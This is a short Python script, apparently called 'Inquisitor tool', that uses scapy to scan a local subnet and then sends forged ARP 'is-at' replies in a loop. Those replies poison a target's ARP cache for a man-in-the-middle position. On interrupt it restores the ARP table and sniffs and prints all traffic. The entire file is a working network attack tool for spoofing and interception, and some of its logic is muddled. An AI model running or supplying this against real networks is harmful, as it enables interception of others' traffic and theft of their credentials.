import argparse
from scapy.all import Ether, ARP, sendp, sniff, TCP, Raw, srp
import subprocess
import time
import sys

def arp_scan(network):
    print("Scanning network...")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)

    print("Results:")
    print("IP\t\t\tMAC Address")
    print("-----------------------------------------")
    for client in clients_list:
        print(client["ip"] + "\t\t" + client["mac"])

def send_arp_packet(src_ip, src_mac, tgt_ip, tgt_mac):
    ether = Ether(src=src_mac, dst=tgt_mac)
    arp = ARP(psrc=src_ip, pdst=tgt_ip, hwsrc=src_mac, hwdst=tgt_mac, op="is-at")
    packet = ether/arp
    sendp(packet)
    print("ARP spoofing packet sent.")

def restore_arp(src_ip, src_mac, tgt_ip, tgt_mac):
    ether = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(psrc=src_ip, pdst=tgt_ip, hwsrc=src_mac, hwdst="00:00:00:00:00:00", op="who-has")
    packet = ether/arp
    sendp(packet)
    print("ARP table restored.")

def print_packet(packet, verbose):
    # Print summary of all packets
    print(packet.summary())
    # If verbose option is enabled, print details of the packet
    if verbose:
        packet.show()

def main(src_ip, src_mac, tgt_ip, tgt_mac, verbose):
    arp_scan('192.168.1.0/24') # change to your network subnet
    try:
        while True:
            send_arp_packet(src_ip, src_mac, tgt_ip, tgt_mac)
            time.sleep(1)
    except KeyboardInterrupt:
        restore_arp(src_ip, src_mac, tgt_ip, tgt_mac)
    # Capture all packets and print them
    sniff(prn=lambda packet: print_packet(packet, verbose))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Inquisitor tool')
    parser.add_argument('src_ip', help='source IP address')
    parser.add_argument('src_mac', help='source MAC address')
    parser.add_argument('tgt_ip', help='target IP address')
    parser.add_argument('tgt_mac', help='target MAC address')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')

    args = parser.parse_args()

    main(args.src_ip, args.src_mac, args.tgt_ip, args.tgt_mac, args.verbose)